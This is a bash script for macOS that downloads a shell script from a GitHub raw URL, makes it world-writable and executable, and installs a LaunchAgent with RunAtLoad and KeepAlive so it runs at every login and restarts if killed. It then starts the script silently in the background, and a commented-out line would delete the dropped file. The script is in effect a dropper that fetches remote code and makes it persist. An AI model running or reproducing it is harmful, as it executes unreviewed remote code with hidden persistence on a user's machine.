#!/bin/bash

TARGET_DIR="$HOME"
PLIST_PATH="$HOME/Library/LaunchAgents/com.user.notekill.plist"
GITHUB_RAW="https://raw.githubusercontent.com/lamonlemon/n/refs/heads/main/notetest.sh"

curl -s -o "$TARGET_DIR/notekill.sh" "$GITHUB_RAW"
chmod 777 "$TARGET_DIR/notekill.sh"

mkdir -p "$HOME/Library/LaunchAgents"
cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.notekill</string>

    <key>ProgramArguments</key>
    <array>
        <string>~/notekill.sh</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

launchctl unload "$PLIST_PATH" 2>/dev/null
launchctl load "$PLIST_PATH"

nohup "$TARGET_DIR/notekill.sh" > /dev/null 2>&1 &

# rm -f "$TARGET_DIR/notekill.sh"
